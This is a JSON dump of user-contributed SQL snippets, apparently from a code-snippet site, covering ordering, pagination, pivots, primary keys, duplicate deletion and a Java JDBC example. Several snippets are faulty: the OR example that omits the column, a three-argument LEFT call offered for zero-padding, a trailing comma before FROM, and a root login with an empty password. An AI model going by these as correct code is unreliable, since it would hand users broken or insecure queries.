    "description": "SELECT your_column FROM your_table WHERE your_condition LIMIT 5; -- your limit of rows you want to show here\n",
    "reg_date": "2021-10-12T10:00:25.000Z"
  },
  {
    "id": 4026,
    "keyword": null,
    "link": null,
    "title": " sql open queyr",
    "description": " SELECT * FROM OPENQUERY (<Linked Server>, 'SELECT name FROM joe.titles WHERE name = ''NewTitle''');   \n",
    "reg_date": "2021-10-12T10:00:25.000Z"
  },
  {
    "id": 4027,
    "keyword": null,
    "link": null,
    "title": " sql or",
    "description": "Used alongside WHERE to include data when either condition is true. Example: Returns users that live in either Sheffield or Manchester. SELECT * FROM users WHERE city = 'Sheffield' OR 'Manchester';\n",
    "reg_date": "2021-10-12T10:00:25.000Z"
  },
  {
    "id": 4028,
    "keyword": null,
    "link": null,
    "title": " sql oracle limit",
    "description": "-- Oracle <= 11g  SELECT * FROM ( SELECT * FROM emp ORDER BY sal DESC ) WHERE ROWNUM <= 5; \t -- Oracle 12c + SELECT * FROM emp ORDER BY sal DESC FETCH FIRST 5 ROWS ONLY;\t\nSELECT *  FROM   sometable ORDER BY name OFFSET 20 ROWS FETCH NEXT 10 ROWS ONLY;\nSELECT *  FROM   sometable ORDER BY name OFFSET 20 ROWS FETCH NEXT 10 ROWS ONLY; \nsyntax -> SELECT column_name(s) FROM table_name WHERE ROWNUM <= number  ////example/// SELECT * FROM Persons WHERE ROWNUM <=5 \nSELECT ROWNUM, a.* FROM (SELECT customers.*       FROM customers       WHERE customer_id > 4500       ORDER BY last_name) a;\n",
    "reg_date": "2021-10-12T10:00:25.000Z"
  },
  {
    "id": 4029,
    "keyword": null,
    "link": null,
    "title": " sql oracle update multiple rows",
    "description": "UPDATE employee    SET staff_no =             CASE depno                 WHEN 1 THEN 'ab123'                 WHEN 2 THEN 'ab321'                 --...                 ELSE staff_no            END  WHERE depno IN ( 1, 2 ) -- list all cases here. use a subquery if you don't want to / cannot enumerate\n",
    "reg_date": "2021-10-12T10:00:25.000Z"
  },
  {
    "id": 4030,
    "keyword": null,
    "link": null,
    "title": " sql order",
    "description": "SELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2 ASC;\t-- col1 DESC then col2 ASC\n//this_for_descending_order..   SELECT * FROM TableName ORDER BY columnName DESC;  // this_for_ascending_order.. SELECT * FROM TableName ORDER BY columnName ASC;\nSELECT q.*      FROM (SELECT TOP 3 *                FROM table                ORDER BY id DESC) q     ORDER BY q.id ASC\nSELECT * FROM employees ORDER BY employees.employee_id DESC ; &middot;        Ascending ( ASC) &middot;        Descending ( DESC)\nSQL order of execution defines the execution order of clauses.  -Select It starts execution with  -from  (Choose and join tables to get base data) after from -where ( filters base data ) -group by (Aggregates base data) -having (filters aggregated data) -select (returns final data) -order by (sorts the final data) -limit (limits the returned data to a row count)  Only select and from are mandatory\nSELECT DISTINCT column, AGG_FUNC(column_or_expression), &hellip; FROM mytable     JOIN another_table       ON mytable.column = another_table.column     WHERE constraint_expression     GROUP BY column     HAVING constraint_expression     ORDER BY column ASC/DESC     LIMIT count OFFSET COUNT;\n",
    "reg_date": "2021-10-12T10:00:25.000Z"
  },
  {
    "id": 4031,
    "keyword": null,
    "link": null,
    "title": " sql order by",
    "description": "SELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2;\t \t-- col1 DESC then col2 ASC\n//this_for_descending_order..   SELECT * FROM TableName ORDER BY columnName DESC;  // this_for_ascending_order.. SELECT * FROM TableName ORDER BY columnName ASC;\nSELECT * FROM employees ORDER BY employees.employee_id DESC ; &middot;        Ascending ( ASC) &middot;        Descending ( DESC)\nSQL order of execution defines the execution order of clauses.  -Select It starts execution with  -from  (Choose and join tables to get base data) after from -where ( filters base data ) -group by (Aggregates base data) -having (filters aggregated data) -select (returns final data) -order by (sorts the final data) -limit (limits the returned data to a row count)  Only select and from are mandatory\nSELECT DISTINCT column, AGG_FUNC(column_or_expression), &hellip; FROM mytable     JOIN another_table       ON mytable.column = another_table.column     WHERE constraint_expression     GROUP BY column     HAVING constraint_expression     ORDER BY column ASC/DESC     LIMIT count OFFSET COUNT;\nUsed to sort the result data in ascending (default) or descending order through the use of ASC or DESC keywords. Example: Returns countries in alphabetical order. SELECT * FROM countries ORDER BY name;\n",
    "reg_date": "2021-10-12T10:00:25.000Z"
  },
  {
    "id": 4032,
    "keyword": null,
    "link": null,
    "title": " sql order by alphabetical",
    "description": "SELECT id,       first_name,     last_name,    FROM customer   ORDER BY last_name ASC; \nSELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2;\t\t-- col1 DESC then col2 ASC\nORDER BY: is for sorting result either in descending or ascending order.\n",
    "reg_date": "2021-10-12T10:00:25.000Z"
  },
  {
    "id": 4033,
    "keyword": null,
    "link": null,
    "title": " sql order by multiple columns",
    "description": "SELECT * FROM People ORDER BY FirstName DESC, YearOfBirth ASC \nThe following shows that you can perform order by with more than one column. 'ASC' denotes ascending sort order, but is optional as it is the default sort order. 'DESC' denotes descending sort order  SELECT Id, CompanyName, City, Country   FROM Supplier  WHERE Country IN ('USA', 'Japan', 'Germany')  ORDER BY Country ASC, CompanyName DESC\nSELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2;\t\t-- col1 DESC then col2 ASC\nSort by multiple column : ORDER BY column1 DESC, column2\nORDER BY column1 DESC, column2 \n",
    "reg_date": "2021-10-12T10:00:26.000Z"
  },
  {
    "id": 4034,
    "keyword": null,
    "link": null,
    "title": " sql order by timestamp",
    "description": "SELECT timestamp FROM randomTable ORDER BY timestamp ASC >2012-07-11 17:34:57 >2012-07-11 17:33:07 >2012-07-11 17:33:28  SELECT timestamp FROM randomTable ORDER BY timestamp DESC >2012-07-11 17:33:07 >2012-07-11 17:33:28 >2012-07-11 17:34:57\nSELECT timestamp FROM randomTable ORDER BY timestamp ASC;\n",
    "reg_date": "2021-10-12T10:00:26.000Z"
  },
  {
    "id": 4035,
    "keyword": null,
    "link": null,
    "title": " sql order by two columns",
    "description": "The following shows that you can perform order by with more than one column. 'ASC' denotes ascending sort order, but is optional as it is the default sort order. 'DESC' denotes descending sort order  SELECT Id, CompanyName, City, Country   FROM Supplier  WHERE Country IN ('USA', 'Japan', 'Germany')  ORDER BY Country ASC, CompanyName DESC\nSELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2;\t\t-- col1 DESC then col2 ASC\nSort by multiple column : ORDER BY column1 DESC, column2\nORDER BY column1 DESC, column2 \n",
    "reg_date": "2021-10-12T10:00:26.000Z"
  },
  {
    "id": 4036,
    "keyword": null,
    "link": null,
    "title": " sql order by where condition",
    "description": "SELECT ProcductCode AS Id, ProductPrice AS Price FROM Products WITH (NOLOCK) WHERE ProductCode IN ('efg', 'abc', 'xyz') ORDER BY (CASE WHEN ProductCode = 'efg' THEN 1                WHEN ProductCode = 'abc' THEN 2                WHEN ProductCode = 'xyz' THEN 3                ELSE 4  -- in case you change the `where`, put them last           END);\n",
    "reg_date": "2021-10-12T10:00:26.000Z"
  },
  {
    "id": 4037,
    "keyword": null,
    "link": null,
    "title": " sql order columns",
    "description": "SELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2 ASC;\t-- col1 DESC then col2 ASC\n",
    "reg_date": "2021-10-12T10:00:26.000Z"
  },
  {
    "id": 4038,
    "keyword": null,
    "link": null,
    "title": " sql order of execution",
    "description": "1. FROM 2. WHERE 3. GROUP BY 4. HAVING 5. SELECT 6. ORDER BY \n1. FROM 2. WHERE 3. GROUP BY 4. HAVING 5. SELECT 6. ORDER BY         The rows selected by a query are filtered first by the FROM clause join conditions, then the WHERE clause search conditions, and then the HAVING clause search conditions. Inner joins can be specified in either the FROM or WHERE clause without affecting the final result. \nSQL order of execution defines the execution order of clauses.  -Select It starts execution with  -from  (Choose and join tables to get base data) after from -where ( filters base data ) -group by (Aggregates base data) -having (filters aggregated data) -select (returns final data) -order by (sorts the final data) -limit (limits the returned data to a row count)  Only select and from are mandatory\nSELECT DISTINCT column, AGG_FUNC(column_or_expression), &hellip; FROM mytable     JOIN another_table       ON mytable.column = another_table.column     WHERE constraint_expression     GROUP BY column     HAVING constraint_expression     ORDER BY column ASC/DESC     LIMIT count OFFSET COUNT;\n1. FROM (including joins) 2. WHERE 3. GROUP BY 4. HAVING 5. SELECT 6. ORDER BY \n",
    "reg_date": "2021-10-12T10:00:26.000Z"
  },
  {
    "id": 4039,
    "keyword": null,
    "link": null,
    "title": " sql order of execution query",
    "description": "SQL order of execution defines the execution order of clauses.  -Select It starts execution with  -from  (Choose and join tables to get base data) after from -where ( filters base data ) -group by (Aggregates base data) -having (filters aggregated data) -select (returns final data) -order by (sorts the final data) -limit (limits the returned data to a row count)  Only select and from are mandatory\n",
    "reg_date": "2021-10-12T10:00:26.000Z"
  },
  {
    "id": 4040,
    "keyword": null,
    "link": null,
    "title": " sql order of operations",
    "description": "//this_for_descending_order..   SELECT * FROM TableName ORDER BY columnName DESC;  // this_for_ascending_order.. SELECT * FROM TableName ORDER BY columnName ASC;\nSQL order of execution defines the execution order of clauses.  -Select It starts execution with  -from  (Choose and join tables to get base data) after from -where ( filters base data ) -group by (Aggregates base data) -having (filters aggregated data) -select (returns final data) -order by (sorts the final data) -limit (limits the returned data to a row count)  Only select and from are mandatory\nSELECT DISTINCT column, AGG_FUNC(column_or_expression), &hellip; FROM mytable     JOIN another_table       ON mytable.column = another_table.column     WHERE constraint_expression     GROUP BY column     HAVING constraint_expression     ORDER BY column ASC/DESC     LIMIT count OFFSET COUNT;\nUsed to sort the result data in ascending (default) or descending order through the use of ASC or DESC keywords. Example: Returns countries in alphabetical order. SELECT * FROM countries ORDER BY name;\nORDER BY: is for sorting result either in descending or ascending order.\n",
    "reg_date": "2021-10-12T10:00:26.000Z"
  },
  {
    "id": 4041,
    "keyword": null,
    "link": null,
    "title": " sql pad left 0",
    "description": "# LEFT(COLUMN, NUM_AFTER_PAD, PAD_CHAR); SELECT LEFT(COLUMN, 1, '0') FROM TABLE;\n",
    "reg_date": "2021-10-12T10:00:26.000Z"
  },
  {
    "id": 4042,
    "keyword": null,
    "link": null,
    "title": " sql pagination",
    "description": "SELECT col1, col2, ...  FROM ...  WHERE ...   ORDER BY -- this is a MUST there must be ORDER BY statement -- the paging comes here OFFSET     10 ROWS       -- skip 10 rows FETCH NEXT 10 ROWS ONLY; -- take 10 rows\nSELECT * FROM (     SELECT a.*, rownum rn     FROM (         SELECT * FROM ORDERS WHERE CustomerID LIKE 'A%'         ORDER BY OrderDate DESC, ShippingDate DESC     ) a     WHERE rownum < ((pageNumber * pageSize) + 1 ) ) WHERE rn >= (((pageNumber-1) * pageSize) + 1);\nSELECT * FROM SampleFruits ORDER BY Id OFFSET 0 ROWS  FETCH NEXT 7 ROWS ONLY\n--CREATING A PAGING WITH OFFSET and FETCH clauses IN \"SQL SERVER 2012\" DECLARE @PageNumber AS INT, @RowspPage AS INT SET @PageNumber = 2 SET @RowspPage = 10  SELECT ID_EXAMPLE, NM_EXAMPLE, DT_CREATE FROM TB_EXAMPLE ORDER BY ID_EXAMPLE OFFSET ((@PageNumber - 1) * @RowspPage) ROWS FETCH NEXT @RowspPage ROWS ONLY; \n",
    "reg_date": "2021-10-12T10:00:26.000Z"
  },
  {
    "id": 4043,
    "keyword": null,
    "link": null,
    "title": " sql pagination offset",
    "description": "SELECT col1, col2, ...  FROM ...  WHERE ...   ORDER BY -- this is a MUST there must be ORDER BY statement -- the paging comes here OFFSET     10 ROWS       -- skip 10 rows FETCH NEXT 10 ROWS ONLY; -- take 10 rows\nSELECT * FROM (     SELECT a.*, rownum rn     FROM (         SELECT * FROM ORDERS WHERE CustomerID LIKE 'A%'         ORDER BY OrderDate DESC, ShippingDate DESC     ) a     WHERE rownum < ((pageNumber * pageSize) + 1 ) ) WHERE rn >= (((pageNumber-1) * pageSize) + 1);\n",
    "reg_date": "2021-10-12T10:00:26.000Z"
  },
  {
    "id": 4044,
    "keyword": null,
    "link": null,
    "title": " sql pagination oracle",
    "description": "SELECT * FROM (     SELECT a.*, rownum rn     FROM (         SELECT * FROM ORDERS WHERE CustomerID LIKE 'A%'         ORDER BY OrderDate DESC, ShippingDate DESC     ) a     WHERE rownum < ((pageNumber * pageSize) + 1 ) ) WHERE rn >= (((pageNumber-1) * pageSize) + 1);\n",
    "reg_date": "2021-10-12T10:00:27.000Z"
  },
  {
    "id": 4045,
    "keyword": null,
    "link": null,
    "title": " sql paging query",
    "description": "SELECT col1, col2, ...  FROM ...  WHERE ...   ORDER BY -- this is a MUST there must be ORDER BY statement -- the paging comes here OFFSET     10 ROWS       -- skip 10 rows FETCH NEXT 10 ROWS ONLY; -- take 10 rows\nSELECT * FROM SampleFruits ORDER BY Id OFFSET 0 ROWS  FETCH NEXT 7 ROWS ONLY\n",
    "reg_date": "2021-10-12T10:00:27.000Z"
  },
  {
    "id": 4046,
    "keyword": null,
    "link": null,
    "title": " sql period overlap",
    "description": "-- table1          <-----row 1 interval-------> -- table2  <---find this--> <--and this--> <--and this-->  SELECT *  FROM table1,table2  WHERE table2.start <= table1.end  AND (table2.end IS NULL OR table2.end >= table1.start)\n",
    "reg_date": "2021-10-12T10:00:27.000Z"
  },
  {
    "id": 4047,
    "keyword": null,
    "link": null,
    "title": " sql pick random row",
    "description": "SELECT column FROM table ORDER BY RAND() LIMIT 1 \n",
    "reg_date": "2021-10-12T10:00:27.000Z"
  },
  {
    "id": 4048,
    "keyword": null,
    "link": null,
    "title": " sql pipeline example",
    "description": "-- Return types CREATE TYPE t_tf_row AS OBJECT (   \tid           NUMBER,   \tdescription  VARCHAR2(50) ); CREATE TYPE t_tf_tab IS TABLE OF t_tf_row; -- Build a pipelined table function. CREATE OR REPLACE FUNCTION get_tab_ptf (p_rows IN NUMBER)  \tRETURN t_tf_tab PIPELINED AS BEGIN   \tFOR i IN 1 .. p_rows LOOP     \tPIPE ROW(t_tf_row(i, 'Description for ' || i));      \tEND LOOP;   \tRETURN; END; -- Test it. SELECT * FROM TABLE(get_tab_ptf(10)) ORDER BY id DESC;\n",
    "reg_date": "2021-10-12T10:00:27.000Z"
  },
  {
    "id": 4049,
    "keyword": null,
    "link": null,
    "title": " sql pivot",
    "description": "SELECT *        -- Total invoices per gender FROM (     SELECT invoice, gender     FROM sales ) d PIVOT (     sum(invoice)     FOR gender IN ('F' AS \"Women\", 'M' AS \"Men\") ); -- Table Sales: CREATE TABLE sales (     gender VARCHAR2(1 BYTE),\t\t-- 'F' or 'M'     invoice NUMBER );\nselect Firstname, Amount, PostalCode, LastName, AccountNumber from (   select value, columnname   from yourtable ) d pivot (   max(value)   for columnname in (Firstname, Amount, PostalCode, LastName, AccountNumber) ) piv;\nselect * from (   select game, player, goals   from yourtable ) src pivot (   sum(goals)   for player in ([John], [Paul], [Mark], [Luke]) ) piv order by game \nSELECT SalesAgent AS PivotSalesAgent, India, US, UK FROM tblAgentsSales PIVOT  ( \tSUM(SalesAmount) FOR SalesCountry IN (India, US, UK) ) AS testPivotTable   SELECT SalesAgent GrpBySalesAgent, SalesCountry, SUM(SalesAmount) Sales  from tblAgentsSales  GROUP BY SalesAgent, SalesCountry   select SalesAgent TableSalesAgent, SalesCountry, SalesAmount  from tblAgentsSales\nSELECT SalesAgent AS PivotSalesAgent, India, US, UK FROM tblAgentsSales PIVOT  ( \tSUM(SalesAmount) FOR SalesCountry IN (India, US, UK) ) AS testPivotTable   SELECT SalesAgent GrpBySalesAgent, SalesCountry, SUM(SalesAmount) Sales from tblAgentsSales  GROUP BY SalesAgent, SalesCountry   select SalesAgent TableSalesAgent, SalesCountry, SalesAmount from tblAgentsSales\n-- Dynamic Pivot with unknown number of columnnames  DECLARE @cols AS NVARCHAR(MAX),     @query  AS NVARCHAR(MAX)  select @cols = STUFF((SELECT ',' + QUOTENAME(ColumnName)                      from yourtable                     group by ColumnName, id                     order by id             FOR XML PATH(''), TYPE             ).value('.', 'NVARCHAR(MAX)')          ,1,1,'')  set @query = N'SELECT ' + @cols + N' from               (                 select value, ColumnName                 from yourtable             ) x             pivot              (                 max(value)                 for ColumnName in (' + @cols + N')             ) p '  exec sp_executesql @query;\n",
    "reg_date": "2021-10-12T10:00:27.000Z"
  },
  {
    "id": 4050,
    "keyword": null,
    "link": null,
    "title": " sql pivot oracle",
    "description": "SELECT *        -- Total invoices per gender FROM (     SELECT invoice, gender     FROM sales ) d PIVOT (     sum(invoice)     FOR gender IN ('F' AS \"Women\", 'M' AS \"Men\") ); -- Table Sales: CREATE TABLE sales (     gender VARCHAR2(1 BYTE),\t\t-- 'F' or 'M'     invoice NUMBER );\n",
    "reg_date": "2021-10-12T10:00:27.000Z"
  },
  {
    "id": 4051,
    "keyword": null,
    "link": null,
    "title": " sql pivot rows to columns",
    "description": "SELECT *        -- Total invoices per gender FROM (     SELECT invoice, gender     FROM sales ) d PIVOT (     sum(invoice)     FOR gender IN ('F' AS \"Women\", 'M' AS \"Men\") ); -- Table Sales: CREATE TABLE sales (     gender VARCHAR2(1 BYTE),\t\t-- 'F' or 'M'     invoice NUMBER );\nselect Firstname, Amount, PostalCode, LastName, AccountNumber from (   select value, columnname   from yourtable ) d pivot (   max(value)   for columnname in (Firstname, Amount, PostalCode, LastName, AccountNumber) ) piv;\n-- Dynamic Pivot with unknown number of columnnames  DECLARE @cols AS NVARCHAR(MAX),     @query  AS NVARCHAR(MAX)  select @cols = STUFF((SELECT ',' + QUOTENAME(ColumnName)                      from yourtable                     group by ColumnName, id                     order by id             FOR XML PATH(''), TYPE             ).value('.', 'NVARCHAR(MAX)')          ,1,1,'')  set @query = N'SELECT ' + @cols + N' from               (                 select value, ColumnName                 from yourtable             ) x             pivot              (                 max(value)                 for ColumnName in (' + @cols + N')             ) p '  exec sp_executesql @query;\n",
    "reg_date": "2021-10-12T10:00:27.000Z"
  },
  {
    "id": 4052,
    "keyword": null,
    "link": null,
    "title": " sql primary key",
    "description": "A primary key allows each record in a table to be uniquely identified. There can only be one primary key per table, and you can assign this constraint to any single or combination of columns. However, this means each value within this column(s) must be unique. Typically in a table, the primary key is an ID column, and is usually paired with the AUTO_ INCREMENT keyword. This means the value increases automatically as new records are created. CREATE TABLE users ( id int NOT NULL AUTO_INCREMENT, first_name varchar(255), last_name varchar(255) NOT NULL, address varchar(255), email varchar(255), PRIMARY KEY (id) );\nALTER TABLE <Table_Name> DROP CONSTRAINT <constraint_name>  ALTER TABLE <Table_Name> ADD CONSTRAINT <constraint_name> PRIMARY KEY (<Column1>,<Column2>)\n/* A primary key allows each record in a table to be uniquely identified. There can only be one primary key per table, and you can assign this constraint to any single or combination of columns. However, this means each value within this column(s) must be unique. Typically in a table, the primary key is an ID column, and is usually paired with the AUTO_ INCREMENT keyword. This means the value increases automatically as new records are created. */ CREATE TABLE stats(id INT NOT NULL PRIMARY KEY, name TEXT)\nA primary key is a field in a table which uniquely identifies each row/record in a database table. Primary keys must contain unique values. A primary key column cannot have NULL values.  A table can have only one primary key, which may consist of single or multiple fields. When multiple fields are used as a primary key, they are called a composite key.  If a table has a primary key defined on any field(s), then you cannot have two records having the same value of that field(s).\n-- NOTE: this is for SQL-Oracle specifically  -- example: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = 'CUSTOMERS'  AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner;  -- syntax: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = '<table-name>' -- Replace <table-name> with your table-name AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner; \n ALTER TABLE Persons  ADD PRIMARY KEY (ID); \n",
    "reg_date": "2021-10-12T10:00:27.000Z"
  },
  {
    "id": 4053,
    "keyword": null,
    "link": null,
    "title": " sql print all names that start with a given letter",
    "description": "select employee_name  from employees where employee_name LIKE 'A%' OR employee_name LIKE 'B%' order by employee_name\n",
    "reg_date": "2021-10-12T10:00:27.000Z"
  },
  {
    "id": 4054,
    "keyword": null,
    "link": null,
    "title": " sql print concatenate",
    "description": "declare @x INT = 1 /* Declares an integer variable named \"x\" with the value of 1 */      PRINT 'There are ' + CAST(@x AS VARCHAR) + ' alias combinations did not match a record' /* Prints a string concatenated with x casted as a varchar */ \n",
    "reg_date": "2021-10-12T10:00:28.000Z"
  },
  {
    "id": 4055,
    "keyword": null,
    "link": null,
    "title": " sql procedure oracle",
    "description": "CREATE OR REPLACE PROCEDURE my_schema.my_procedure(param1 IN VARCHAR2) IS     cnumber NUMBER; BEGIN     cnumber := 10;     INSERT INTO my_table (num_field) VALUES (param1 + cnumber);     COMMIT; EXCEPTION     WHEN OTHERS THEN         raise_application_error(-20001, 'An error was encountered - '             || sqlcode || ' -ERROR- ' || sqlerrm); END;\n",
    "reg_date": "2021-10-12T10:00:28.000Z"
  },
  {
    "id": 4056,
    "keyword": null,
    "link": null,
    "title": " sql query duplicate rows",
    "description": "SELECT username, email, COUNT(*) FROM users GROUP BY username, email HAVING COUNT(*) > 1 \nSELECT name, COUNT(email)  FROM users GROUP BY email HAVING COUNT(email) > 1\nSELECT [CaseNumber], COUNT(*) AS Occurrences FROM [CaseCountry] GROUP BY [CaseNumber] HAVING (COUNT(*) > 1)\nSELECT username, email, COUNT(*) FROM users GROUP BY username, email HAVING COUNT(*) > 1\n",
    "reg_date": "2021-10-12T10:00:28.000Z"
  },
  {
    "id": 4057,
    "keyword": null,
    "link": null,
    "title": " sql query for displaying age from oldest to youngest",
    "description": "//Oldest to youngest SELECT * FROM table_name ORDER BY age DESC;  //Youngest to oldest SELECT * FROM table_name ORDER BY age ASC;\n",
    "reg_date": "2021-10-12T10:00:28.000Z"
  },
  {
    "id": 4058,
    "keyword": null,
    "link": null,
    "title": " sql query for getting data with join and count",
    "description": "Correlated subquery  SELECT job_Desc  ,(select count(*) from employee where employee.job_id = jobs.job_id) as count FROM Jobs ORDER BY 2  refrence: https://azagappan.wordpress.com/2006/06/23/using-count-with-joins/#:~:text=COUNT(*) returns the number,number of unique, nonnull values.\n",
    "reg_date": "2021-10-12T10:00:28.000Z"
  },
  {
    "id": 4059,
    "keyword": null,
    "link": null,
    "title": " sql query in java",
    "description": "import java.sql.*;  /**  * A Java MySQL SELECT statement example.  * Demonstrates the use of a SQL SELECT statement against a  * MySQL database, called from a Java program.  *   * Created by Alvin Alexander, http://alvinalexander.com  */ public class JavaMysqlSelectExample {    public static void main(String[] args)   {     try     {       // create our mysql database connection       String myDriver = \"org.gjt.mm.mysql.Driver\";       String myUrl = \"jdbc:mysql://localhost/test\";       Class.forName(myDriver);       Connection conn = DriverManager.getConnection(myUrl, \"root\", \"\");              // our SQL SELECT query.        // if you only need a few columns, specify them by name instead of using \"*\"       String query = \"SELECT * FROM users\";        // create the java statement       Statement st = conn.createStatement();              // execute the query, and get a java resultset       ResultSet rs = st.executeQuery(query);              // iterate through the java resultset       while (rs.next())       {         int id = rs.getInt(\"id\");         String firstName = rs.getString(\"first_name\");         String lastName = rs.getString(\"last_name\");         Date dateCreated = rs.getDate(\"date_created\");         boolean isAdmin = rs.getBoolean(\"is_admin\");         int numPoints = rs.getInt(\"num_points\");                  // print the results         System.out.format(\"%s, %s, %s, %s, %s, %s\\n\", id, firstName, lastName, dateCreated, isAdmin, numPoints);       }       st.close();     }     catch (Exception e)     {       System.err.println(\"Got an exception! \");       System.err.println(e.getMessage());     }   } } \nstmt = con.createStatement(); \n2, Fred, Flinstone, 2010-06-23, false, 6000 3, Barney, Rubble, 2010-06-23, false, 5000 \nResultSet rs = stmt.executeQuery(query); \n",
    "reg_date": "2021-10-12T10:00:28.000Z"
  },
  {
    "id": 4060,
    "keyword": null,
    "link": null,
    "title": " sql query inline if",
    "description": "case MyFlag when 1 then 'Yes' else 'No' end\n",
    "reg_date": "2021-10-12T10:00:28.000Z"
  },
  {
    "id": 4061,
    "keyword": null,
    "link": null,
    "title": " sql query inner join 3 tables",
    "description": "# no need to use parentheses - works fine SELECT * FROM names A INNER JOIN address B ON A.personID = B.personID INNER JOIN emailAddress C ON A.personID = C.personID INNER JOIN phoneNumbers D ON A.personID = D.personID;\n# no need to use parentheses - works fine SELECT * FROM names A INNER JOIN address B ON A.personID = B.personID INNER JOIN emailAddress C ON A.personID = C.personID INNER JOIN phoneNumbers D ON A.personID = D.personID;  \nSELECT column-names   FROM table-name1 JOIN table-name2      ON column-name1 = column-name2  WHERE condition\n",
    "reg_date": "2021-10-12T10:00:28.000Z"
  },
  {
    "id": 4062,
    "keyword": null,
    "link": null,
    "title": " sql query interview questions githu",
    "description": "SELECT e.name AS 'Employee Name', e2.name AS 'Boss',  e.salary AS 'Employee salary', e2.salary AS 'Boss salary' FROM employees e JOIN employees e2 ON e.boss_id = e2.employee_id WHERE e2.salary < e.salary;\n",
    "reg_date": "2021-10-12T10:00:28.000Z"
  },
  {
    "id": 4063,
    "keyword": null,
    "link": null,
    "title": " sql query multiple tables",
    "description": "-- With JOIN -- No row if id does not exist in t2 SELECT t1.name, t2.salary FROM t1 JOIN t2 on t1.id = t2.id; -- A row with a NULL salary is returned if id does not exist in t2 SELECT t1.name, t2.salary FROM t1 LEFT OUTER JOIN t2 on t1.id = t2.id;  -- With UNION: distinct values SELECT emp_name AS name from employees UNION SELECT cust_name AS name from customers;  -- With UNION ALL: keeps duplicates (faster) SELECT emp_name AS name from employees UNION ALL SELECT cust_name AS name from customers;\n",
    "reg_date": "2021-10-12T10:00:28.000Z"
  },
  {
    "id": 4064,
    "keyword": null,
    "link": null,
    "title": " sql query order",
    "description": "SELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2 ASC;\t-- col1 DESC then col2 ASC\n//this_for_descending_order..   SELECT * FROM TableName ORDER BY columnName DESC;  // this_for_ascending_order.. SELECT * FROM TableName ORDER BY columnName ASC;\nSELECT q.*      FROM (SELECT TOP 3 *                FROM table                ORDER BY id DESC) q     ORDER BY q.id ASC\nSQL order of execution defines the execution order of clauses.  -Select It starts execution with  -from  (Choose and join tables to get base data) after from -where ( filters base data ) -group by (Aggregates base data) -having (filters aggregated data) -select (returns final data) -order by (sorts the final data) -limit (limits the returned data to a row count)  Only select and from are mandatory\n",
    "reg_date": "2021-10-12T10:00:29.000Z"
  },
  {
    "id": 4065,
    "keyword": null,
    "link": null,
    "title": " sql query row number group by",
    "description": "SELECT     Date,        ROW_NUMBER() OVER (PARTITION BY Date ORDER By Date, Cat) as ROW,    Cat,    Qty FROM SOURCE \n",
    "reg_date": "2021-10-12T10:00:29.000Z"
  },
  {
    "id": 4066,
    "keyword": null,
    "link": null,
    "title": " sql query to check if column contains alphabets",
    "description": "SELECT *  FROM table_name WHERE CAST(PRIME_KEY AS STRING) RLIKE '([0-9]+[a-z]+)'\n",
    "reg_date": "2021-10-12T10:00:29.000Z"
  },
  {
    "id": 4067,
    "keyword": null,
    "link": null,
    "title": " sql query to copy data from one column to another",
    "description": "UPDATE table SET columnB = columnA; \nUPDATE table_name SET     destination_column_name=orig_column_name WHERE condition_if_necessary \n",
    "reg_date": "2021-10-12T10:00:29.000Z"
  },
  {
    "id": 4068,
    "keyword": null,
    "link": null,
    "title": " sql query to delete duplicate records",
    "description": "DELETE FROM dups a USING (       SELECT MIN(ctid) as ctid, key         FROM dups          GROUP BY key HAVING COUNT(*) > 1       ) b       WHERE a.key = b.key        AND a.ctid <> b.ctid\nWITH cte AS (     SELECT          contact_id,          first_name,          last_name,          email,          ROW_NUMBER() OVER (             PARTITION BY                  first_name,                  last_name,                  email             ORDER BY                  first_name,                  last_name,                  email         ) row_num      FROM          sales.contacts ) DELETE FROM cte WHERE row_num > 1; \nSELECT DISTINCT col1,col2... FROM table_name where Condition;\n-- Oracle DELETE films WHERE rowid NOT IN (     SELECT min(rowid)     FROM films     GROUP BY title, uk_release_date );\n# Step 1: Copy distinct values to temporary table CREATE TEMPORARY TABLE tmp_user (     SELECT id, name      FROM user     GROUP BY name );  # Step 2: Remove all rows from original table DELETE FROM user;  # Step 3: Remove all rows from original table INSERT INTO user (SELECT * FROM tmp_user);  # Step 4: Remove temporary table DROP TABLE tmp_user; \n--ID should be primary key  --get duplicate records using RANK SELECT E.ID,      E.firstname,      E.lastname,      E.country,      T.rank FROM [SampleDB].[dbo].[Employee] E   INNER JOIN (  SELECT *,          RANK() OVER(PARTITION BY firstname,                                   lastname,                                   country         ORDER BY id) rank  FROM [SampleDB].[dbo].[Employee] ) T ON E.ID = t.ID;  --delete duplications DELETE E     FROM [SampleDB].[dbo].[Employee] E          INNER JOIN     (         SELECT *,                 RANK() OVER(PARTITION BY firstname,                                          lastname,                                          country                ORDER BY id) rank         FROM [SampleDB].[dbo].[Employee]     ) T ON E.ID = t.ID     WHERE rank > 1;\n",
